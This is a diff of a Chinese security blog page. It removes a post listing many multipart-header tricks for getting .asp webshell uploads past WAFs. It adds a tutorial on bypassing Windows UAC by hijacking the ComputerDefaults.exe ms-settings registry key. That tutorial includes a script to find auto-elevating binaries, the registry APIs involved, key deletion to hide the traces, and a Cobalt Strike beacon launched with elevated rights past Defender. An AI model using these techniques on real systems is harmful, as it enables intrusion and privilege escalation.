@@ -26,7 +26,7 @@
 
   
 
-  <title>常规WAF上传绕过 | ꧁༺黑色༒星辰༻꧂</title>
+  <title>BypassUAC的研究和思路 | ꧁༺黑色༒星辰༻꧂</title>
 
   
 
@@ -100,20 +100,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">常规WAF上传绕过</h1>
+          <h1 class="title-wrap">BypassUAC的研究和思路</h1>
           <h2 class="title-sub-wrap">
             <strong>ANQUSEC</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-10-13T09:40:11.000Z" itemprop="datePublished">2021-10-13</time>
+            <time  class="article-date" datetime="2021-10-30T12:49:40.000Z" itemprop="datePublished">2021-10-30</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/%E9%98%B2%E7%81%AB%E5%A2%99/">📒 防火墙</a></li>
+    <li><a href="/categories/%E5%85%8D%E6%9D%80/">📒 免杀</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/WAF%E7%BB%95%E8%BF%87/">🏷️ WAF绕过</a></li>
+    <li><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">🏷️ 渗透测试</a></li>
   
 </ul>
         </div>
@@ -137,138 +137,132 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>默认状态</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破0</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”[0x09]a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破1 去掉双引号</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=a.asp</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破2 添加一个filename1</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”;filename1=”test.jpg”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破3 form中间+</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: f+orm-data; name=”filepath”;filename=”test.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破4 大小写</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破5 去掉form-data</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破6 在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格</p>
-<p>[mw_shl_code=bash,true][mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code][/mw_shl_code]</p>
-<p>突破7 a.asp . (空格+.)</p>
-<p>[mw_shl_code=bash,true][mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp .”</p>
-<p>Content-Type: text/html[/mw_shl_code][/mw_shl_code]</p>
-<p>突破8 “换行</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp</p>
-<p>“</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破9 NTFS流</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”test.asp::$DATA”</p>
-<p>Content-Type: text/html</p>
-<p>——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”test.asp::$DATA\0x00\fuck.asp0x00.jpg”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破10 经过对IIS 6.0的测试发现，其总是采用第一个Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传test.asp成功]：</p>
-<p>[mw_shl_code=bash,true]Content-Disposition: form-data; name=”FileUploadName”; filename=”test.asp”</p>
-<p>—————————–15377259221471</p>
-<p>Content-Disposition: form-data; name=”FileUploadName”; filename=”test.txt”</p>
-<p>Content-Type: application/octet-stream</p>
-<p>Content-Disposition: form-data; name=”FileUploadName”; filename=”test.asp”</p>
-<p>Content-Disposition: form-data;</p>
-<p>name=”FileUploadName”; filename=”test.asp”[/mw_shl_code]</p>
-<p>突破11 换位</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Type: text/html</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”[/mw_shl_code]</p>
-<p>​    在上述的方法中，还有些方法可以过安全狗，也可以过D盾、360网站卫士等等。另外从上述方法中，若按你们的想法，会分成那些类型？我在这里统一划分为特性和WAF解析不当(PS下，我不是学术派，较口语化)i，特性包括系统特性，协议特性等等，比如上述中，大多数都属于协议的特性，因为FORM-DATA的协议十分松散；部分属于系统特性，比如加空格、点号、NTFS流等等。而解析不当，比如上述的第二种添加一个filename1，这种在正常情况下无法使用的，如果第0种，对特殊字符无法解析，归根到底也是WAF对内容解析的不当处理。</p>
-<p>​    针对于特性，在上传这一块，好像能用到的就只有系统特性和协议特性，系统特性从系统出现到现在才挖掘出那么一点点，对于我等菜鸟而言，就更难挖掘了。于是我们就把目光放到协议上。</p>
-<p>默认状态</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上述方法我们已经开始测试，那么，有没有想过。既然你们想得到用window特性来+空格，有没有想过用协议来+-空格</p>
-<p>突破方法001</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition:form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法002</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法003</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type:text/html[/mw_shl_code]</p>
-<p>突破方法004</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename= “a.asp”</p>
-<p>Content-Type:text/html[/mw_shl_code]</p>
-<p>突破方法005</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上述就5种方法了，然后呢，空格可以，谁可以代替空格，tab？咱们来试试</p>
-<p>突破方法006</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition:   form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法007</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data;   name=”uploaded”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法008</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=  “a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上面的方法可以延伸很多种了，记住一点，什么可以替换空格！</p>
-<p>接下来，我们在根据之前公布的方法 ，大小写</p>
-<p>突破方法009</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法010</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: Form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法011</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; Name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法012</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; Filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法013</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-type: text/html[/mw_shl_code]</p>
-<p>然后，这里在针对一个漏洞结合下，记得form-data中见存在一个+号吗，为什么不能放到前面或者后面</p>
-<p>突破方法014</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: +form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法015</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data+; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p><img src="/2021/10/13/%E5%B8%B8%E8%A7%84WAF%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/183226-16260859463ec7.jpg"></p>
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><strong>用户帐户控制</strong>(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理的平台。</p>
+<p>使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
+<p>用户帐户控制(UAC)是<strong>新版Windows</strong>的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640-16355982259091" alt="图片"></p>
+<p>而在这些程序里面，有的需要授权、有的不需要，是因为UAC是分授权等级的</p>
+<p>首先请按Win+R，输入gpedit.msc，打开组策略。</p>
+<p>然后我们在左侧窗口找到“计算机配置–Windows设置–安全设置–本地策略–安全选项”，再在右侧窗口找到“用户帐户控制：管理员批准模式中管理员的提升权限提示的行为”，双击该条目，打开设置窗口，如下图：</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<blockquote>
+<p>不提示直接提升：关闭UAC，需要权限时直接提升权限。</p>
+<p>在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。</p>
+<p>在安全桌面上同意提示：需要权限时在安全桌面上选择“允许”提升权限。</p>
+<p>提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。</p>
+<p>同意提示：需要权限时在普通窗口中选择“允许”提升权限。</p>
+<p>非 Windows 二进制文件的同意提示：(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择“允许”提升权限。</p>
+</blockquote>
+<p>因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。</p>
+<p>如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在Linux中的相应操作类似。</p>
+<p>•程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力•权限提升仅对此次进程有效</p>
+<p>提升权限的操作大致有两个：</p>
+<p>•自动提权请求•手动提权请求</p>
+<p>手动提权就是“以管理员身份运行”，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器</p>
+<p>在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。</p>
+<p><strong>visual studio里面的uac</strong></p>
+<p>在visual studio里面有一个manifest文件，这个文件本质上是一个xml文件，用于标识当前应用程序的配置属性。其中这几个级别明细如下</p>
+<blockquote>
+<p>•aslnvoker 默认权限•highestAvailable 最高权限•requireAdministrator 必须是管理员权限</p>
+</blockquote>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<p>将编译选项调整为requireAdministrator，则当用户运行程序后，将获得管理员权限会话,不需要绕过UAC。</p>
+<h1 id="挖掘白名单的uac程序"><a href="#挖掘白名单的uac程序" class="headerlink" title="挖掘白名单的uac程序"></a>挖掘白名单的uac程序</h1><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p>
+<p>那么我们要寻找的uac程序需要符合以下几个要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 程序的manifest标识的配置属性 autoElevate 为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</span><br></pre></td></tr></table></figure>
+
+<p>首先是寻找autoElevate为true的程序，这里就写一个py脚本去批量跑一下，这里就找system32目录下面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import os from subprocess import *  path = &#x27;c:\windows\system32&#x27; files = os.listdir(path) print(files) def GetFileList(path, fileList):     newDir = path     if os.path.isfile(path):         if path[-4:] == &#x27;.exe&#x27;:             fileList.append(path)     elif os.path.isdir(path):         try:             for s in os.listdir(path):                 newDir=os.path.join(path,s)                 GetFileList(newDir, fileList)         except Exception as e:             pass     return fileList files = GetFileList(path, []) print(files) for eachFile in files:     if eachFile[-4:] == &#x27;.exe&#x27;:         command = r&#x27;.\sigcheck64.exe -m &#123;&#125; | findstr auto&#x27;.format(eachFile)         print(command)         p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)         if &#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27; in p1.stdout.read().decode(&#x27;gb2312&#x27;):             copy_command = r&#x27;copy &#123;&#125; .\success&#x27;.format(eachFile)             Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)             print(&#x27;[+] &#123;&#125;&#x27;.format(eachFile))             with open(&#x27;success.txt&#x27;, &#x27;at&#x27;) as f:                 f.writelines(&#x27;&#123;&#125;\n&#x27;.format(eachFile))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<p>整理之后exe如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\bthudtask.exe c:\windows\system32\changepk.exe c:\windows\system32\ComputerDefaults.exe c:\windows\system32\dccw.exe c:\windows\system32\dcomcnfg.exe c:\windows\system32\DeviceEject.exe c:\windows\system32\DeviceProperties.exe c:\windows\system32\djoin.exe c:\windows\system32\easinvoker.exe c:\windows\system32\EASPolicyManagerBrokerHost.exe c:\windows\system32\eudcedit.exe c:\windows\system32\eventvwr.exe c:\windows\system32\fodhelper.exe c:\windows\system32\fsquirt.exe c:\windows\system32\FXSUNATD.exe c:\windows\system32\immersivetpmvscmgrsvr.exe c:\windows\system32\iscsicli.exe c:\windows\system32\iscsicpl.exe c:\windows\system32\lpksetup.exe c:\windows\system32\MSchedExe.exe c:\windows\system32\msconfig.exe c:\windows\system32\msra.exe c:\windows\system32\MultiDigiMon.exe c:\windows\system32\newdev.exe c:\windows\system32\odbcad32.exe c:\windows\system32\PasswordOnWakeSettingFlyout.exe c:\windows\system32\pwcreator.exe c:\windows\system32\rdpshell.exe c:\windows\system32\recdisc.exe c:\windows\system32\rrinstaller.exe c:\windows\system32\shrpubw.exe c:\windows\system32\slui.exe c:\windows\system32\Sysprep\sysprep.exe c:\windows\system32\SystemPropertiesAdvanced.exe c:\windows\system32\SystemPropertiesComputerName.exe c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe c:\windows\system32\SystemPropertiesHardware.exe c:\windows\system32\SystemPropertiesPerformance.exe c:\windows\system32\SystemPropertiesProtection.exe c:\windows\system32\SystemPropertiesRemote.exe c:\windows\system32\SystemSettingsAdminFlows.exe c:\windows\system32\SystemSettingsRemoveDevice.exe c:\windows\system32\Taskmgr.exe c:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exe c:\windows\system32\WindowsUpdateElevatedInstaller.exe c:\windows\system32\WSReset.exe c:\windows\system32\wusa.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后再去寻找不弹uac框的程序，这里我就从上往下开始尝试，找到的是<code>ComputerDefaults.exe  </code>这个exe</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>运行之后直接就会出现默认应用这个界面</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<h1 id="uac程序特性探究"><a href="#uac程序特性探究" class="headerlink" title="uac程序特性探究"></a>uac程序特性探究</h1><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p>
+<p>这里使用proc监听<code>ComputerDefaults.exe</code></p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>发现他会去查询<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>里面的值</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>那么我们创建一个<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>路径，再对<code>ComputerDefaults.exe</code>进行监听尝试</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<p>然后发现他还会去查询<code>HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute</code>，而且Result显示的是NAME NOT FOUND，那么可以认为首先去查询<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>路径下的注册表，再去查询<code>HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute</code>是否存在</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<p>那么这里我创建一个DelegateExecute的键值对，然后把默认键值对指向我的一个程序进行尝试</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>当我运行<code>c:\windows\system32\ComputerDefaults.exe</code>的时候，发现不再弹出的是默认进程的界面，而是打开了我自己的程序</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>那么这里就可以大胆的猜测一下，首先运行<code>ComputerDefaults.exe</code>这个程序之前，会查询<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>这个目录是否存在，若存在继续寻找同目录下是否有<code>DelegateExecute</code>这个键值对，若两者都存在则执行<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>指向的exe路径</p>
+<p>为了验证猜想，这里我将exe路径改为cmd，若猜测成立则可以获得管理员权限的cmd</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p><code>whoami /priv</code>查看一下果然成功</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<h1 id="bypass的实现"><a href="#bypass的实现" class="headerlink" title="bypass的实现"></a>bypass的实现</h1><p>经过上面的探究过后，我们整理下思路，首先要创建注册表，并添加<code>DelegateExecute</code>这个键值对，并修改<code>command</code>的指向exe路径即可bypassuac，那么这里用到一下几个函数</p>
+<p><strong>RegCreateKeyExA</strong></p>
+<p>首先是创建注册表项，对应的是之前创建<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>这个路径的操作，这个路径默认情况下是不存在的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegCreateKeyExA(  [in]            HKEY                        hKey,  [in]            LPCSTR                      lpSubKey,                  DWORD                       Reserved,  [in, optional]  LPSTR                       lpClass,  [in]            DWORD                       dwOptions,  [in]            REGSAM                      samDesired,  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,  [out]           PHKEY                       phkResult,  [out, optional] LPDWORD                     lpdwDisposition);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>hkey:句柄</p>
+<p>lpSubKey:此函数打开或创建的子项的名称</p>
+<p>Reserved:保留参数，必须为0</p>
+<p>lpClass:该键的用户定义类类型。可以忽略此参数。此参数可以为<strong>NULL</strong></p>
+<p>dwOptions:有几个值，使用的时候具体查询</p>
+<p>samDesired:指定要创建的密钥的访问权限的掩码</p>
+<p>lpSecurityAttributes:指向SECURITY_ATTRIBUTES结构的指针</p>
+<p>phkResult:指向接收打开或创建的键的句柄的变量的指针</p>
+<p>lpdwDisposition:指向处置值变量的指针</p>
+</blockquote>
+<p><strong>RegSetValueExA</strong></p>
+<p>再就是修改注册表项，指向我们的恶意exe路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegSetValueExA(  [in]           HKEY       hKey,  [in, optional] LPCSTR     lpValueName,                 DWORD      Reserved,  [in]           DWORD      dwType,  [in]           const BYTE *lpData,  [in]           DWORD      cbData);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>hkey:句柄</p>
+<p>lpValueName:要设置的值的名称</p>
+<p>Reserved:保留参数，必须为0</p>
+<p>dwType:<em>lpData</em>参数指向的数据类型</p>
+<p>lpData:要存储的数据</p>
+<p>cbData:<em>lpData</em>参数指向的信息的大小，以字节为单位</p>
+</blockquote>
+<p><strong>RegDeleteTreeA</strong></p>
+<p>执行exe过后我们为了隐蔽最好是删除这个路径，那么就需要用到这个api</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS RegDeleteTreeA(  [in]           HKEY   hKey,  [in, optional] LPCSTR lpSubKey);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>hkey:句柄</p>
+<p>lpSubKey:密钥的名称</p>
+</blockquote>
+<p>这里测试一下，先把路径写成cmd.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char filePath[] = &quot;C:\\Windows\\System32\\cmd.exe&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>实现效果如下</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>这里cmd的实现成功了，那么直接使用cs的马上线能不能够直接bypassuac呢，实验一下，这里把路径改为cs马的路径</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>实现效果如下</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>这里为了验证已经bypass了uac，我后面手动自己点了一下cs的木马，第一个就是我们通过我们写的程序上线的，第二个就是直接点击上线的，看一下区别</p>
+<p>仔细看的话这里bypass过的右上角有一个*</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>首先看一下第一个对话</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>再看下第二个对话，很明显这里已经bypass过了uac</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640.webp" alt="图片"></p>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>我们所使用的几个api，如<code>RegCreateKeyExA</code>、<code>RegSetKeyExA</code>都是直接修改注册表的操作，这种操作应该被归类为敏感操作，那么这里会不会被杀软拦截呢，去测试一下</p>
+<p>windows defender正常上线</p>
+<p><img src="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/640-16355982259098" alt="图片"></p>
+<p>获取到的权限也是bypassuac后的权限</p>
